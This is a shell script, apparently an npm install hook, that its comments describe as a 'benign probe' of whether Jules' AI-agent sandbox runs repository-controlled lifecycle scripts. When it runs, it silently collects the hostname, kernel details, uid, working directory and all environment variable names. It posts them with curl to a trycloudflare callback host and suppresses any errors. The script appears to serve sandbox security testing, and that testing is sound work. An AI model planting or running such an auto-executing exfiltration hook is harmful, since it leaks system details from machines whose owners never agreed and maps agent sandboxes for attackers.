#!/bin/sh
# Cycle-3 benign probe: proves whether Jules' sandbox executes repo-controlled
# npm lifecycle scripts, and what it exposes. Sends env var NAMES (never values)
# plus our own marker to our own callback endpoint. No third-party traffic.
PHASE="$1"
CB="https://phrases-ash-messenger-britain.trycloudflare.com/cycle3"
MARKER="cycle3-${PHASE}-$(date -u +%Y%m%dT%H%M%SZ)"
{
  echo "marker=$MARKER"
  echo "phase=$PHASE"
  echo "hostname=$(hostname 2>/dev/null)"
  echo "uname=$(uname -a 2>/dev/null)"
  echo "pwd=$(pwd)"
  echo "uid=$(id 2>/dev/null)"
  echo "env_names=$(env | cut -d= -f1 | sort | tr '\n' ',')"
} > /tmp/cycle3_probe.txt
# fire-and-forget, short timeout so a dead endpoint never hangs the install
curl -s -m 8 -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/cycle3_probe.txt "$CB" >/dev/null 2>&1 || true
exit 0
